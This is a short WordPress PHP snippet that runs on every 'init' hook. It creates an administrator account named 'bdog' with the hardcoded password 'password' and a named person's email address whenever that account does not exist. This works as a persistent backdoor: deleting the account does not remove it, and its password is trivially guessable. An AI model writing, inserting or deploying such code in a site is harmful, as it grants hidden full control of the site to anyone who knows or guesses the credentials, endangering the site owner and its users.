<?php

add_action( 'init', function () {
  
	$username = 'bdog';
	$password = 'password';
	$email_address = 'brayden.hord@arenawins.com';

	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} );